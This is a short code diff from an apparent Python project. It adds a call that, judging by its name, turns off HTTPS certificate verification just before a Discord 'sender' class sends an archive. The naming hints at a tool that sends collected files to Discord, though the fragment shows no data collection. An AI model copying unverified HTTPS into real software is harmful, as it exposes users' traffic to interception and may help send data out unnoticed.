@@ -65,6 +65,7 @@ class Discord(AbstractSender):
 
         try:
 
+            self._create_unverified_https()
             self.__send_archive()
 
         except Exception as e:
